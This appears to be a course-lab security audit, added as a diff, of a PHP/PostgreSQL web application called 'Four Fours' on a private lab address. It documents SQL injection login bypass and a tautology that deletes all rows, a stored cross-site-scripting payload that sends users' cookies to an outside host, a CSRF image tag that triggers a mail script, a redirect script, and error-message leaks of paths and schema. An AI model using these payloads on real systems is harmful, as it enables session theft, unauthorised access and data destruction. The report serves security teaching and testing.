@@ -1,0 +1,98 @@
+--------------------------------------------------------------------
+                              ISSUE 1
+
+Vulnerability: Injection
+
+Issuing x' or '1'='1 as a password, allows us to login. This means that the used query by the PHP script provides the external quotation marks for the inputs. Here, we log in as Alex (presumably the first user found in the account table).
+
+Exploit a: Unauthorized access to the web application can delete expression entries and also add number of different expressions such that the quota for database is reached consequently denying to accept any further expressions.
+
+--------------------------------------------------------------------
+                              ISSUE 2
+
+Vulnerability: Broken Authentication and Session Management.
+
+Four Fours web application uses HTTP insecure channel to submit a form which has a password field. Using Vega vulnerability detection tool, we discovered that password are being sent in a clear text form. Furthermore, during logout operation unset($_SESSION) only destroys a single variable. All session variables are not properly being destroyed during logout operation.
+
+Exploit a: Sending login credentials over insecure channel could lead to confidential information of each user to be leaked to third party. Eavesdropping on the communication data is possible consequently corrupting data between client and a server.
+
+Exploit b: If userA is had a session on a public machine, the session remains for any other user who logs in to the same public machine. Therefore, a hacker could steal a session of an authorised user.
+
+--------------------------------------------------------------------
+                              ISSUE 3
+
+Vulnerability: Cross-site Scripting
+
+<script> 
+	var xhttp = new XMLHttpRequest();
+	xhttp.open("GET", "http://cslinux.utm.utoronto.ca/~chohanmu/getCookie.php?cookie="+document.cookie, true);
+	xhttp.send();
+</script>
+
+Exploit a: When we enter above script as an entry for expression, any subsequent logging on site or refresh will send us a copy of cookie to my website at cslinux.utm.utoronto.ca/~chohanmu/. A php script getCookie.php runs on my site which saves a cookie received from fourFours in a saveCookies.txt. These cookies can then be used to steal a session.
+
+--------------------------------------------------------------------
+                              ISSUE 4
+
+Vulnerability: Cross-Site Request Forgery
+
+Inserting below code as an expression will make user to believe everything is normal however 4 will appear as an expression entry while whenever page refreshes or another user logs in, our html img tag runs attempting to get an image from src but a php gets executed.
+
+4<img src="http://cslinux.utm.utoronto.ca/~chohanmu/mail.php" style="width:1px;height:1px;">
+
+Exploit a:  Without a knowledge of a user, an email can be sent to anyone in a response of the user's action.
+
+--------------------------------------------------------------------
+                              ISSUE 5
+
+Vulnerability: Unvalidated Redirects and Forwards
+
+<script> 
+	window.location.href = "invalid";
+</script>
+
+Exploit a: After entering above code as an expression, any subsequent authorised users can be redirected to another site where an attacker can launch a scam or steal user information.
+
+--------------------------------------------------------------------
+                              ISSUE 6
+
+Vulnerability: Insecure Direct Object References
+
+http://192.168.56.128/fourFours/index.php?operation=deleteExpression&expressionId=0%20OR%20TRUE--
+
+Exploit a: When we are logged in and modify a URL such that we pass a tautology in the URL, results in executing our SQL statement on server affectively deleting all expressions in a table.
+
+--------------------------------------------------------------------
+                              ISSUE 7
+
+Vulnerability: Exposure of Local file system paths.
+
+Entering a single quote in a password field displayed us critical information which could be used to track files on machine where index.php is hosted. We notice that output we get as a result of a single quote in a password feild is a absolute file system path to index.php /var/www/fourFours/index.php 
+
+Exploit a: This vulnerability could lead to getting contents of files in a file system and confidential information can be leaked to hackers.
+
+Exploit b: Since hacker has easily got to know where over page is located, he could easily trace through file system using URL and get to know structure of our site in details and code.
+--------------------------------------------------------------------
+
+Other relevant information about web application four Fours
+
+#1
+From invalid HTTP request we sent to server, we found out that this web application is on ubuntu server running apache 2.2.8 and PHP 5.2.4 at IP address 192.168.56.128 and on port 80.
+
+Input: http://192.168.56.128/fourFours/index.php;PHPSESSID=?passwd=%27
+
+Output:
+Not Found
+The requested URL /fourFours/index.php;PHPSESSID= was not found on this server.
+Apache/2.2.8 (Ubuntu) PHP/5.2.4-2ubuntu5.7 with Suhosin-Patch Server at 192.168.56.128 Port 80
+
+#2
+Seeing that server is using PHP and Apache, we originally assumed that it is using mySQL as DBMS. Later though, after we issued a single quote as a password, the reported error by the web server displayed functions pg_prepare(), pg_fetch_row(), and pg_execute(), which are supported only against PostgreSQL 7.4 or higher. So our DBMS is PostgreSQL. Also, the error suggested the input is being used without sanitization, as the error mentioned is a missing terminating quote. This submission also exposes internal information about the schema of the database. We find out the name of the table that the authentication uses and three field names: lastName, passwd and username, and two partial field names that are also part of account table (...ame and pa...). We think that ...ame is most likely be firstName and pa... is probably passwd.
+
+Input: ' in the password field.
+Output:
+Warning: pg_prepare() [function.pg-prepare]: Query failed: ERROR: unterminated quoted string at or near "''' AND passwd=''" LINE 1: ...ame, lastName, passwd FROM account WHERE username=''' AND pa... ^ in /var/www/fourFours/index.php on line 20
+
+Warning: pg_execute() [function.pg-execute]: Query failed: ERROR: unnamed prepared statement does not exist in /var/www/fourFours/index.php on line 21
+
+Warning: pg_fetch_row() expects parameter 1 to be resource, boolean given in /var/www/fourFours/index.php on line 22
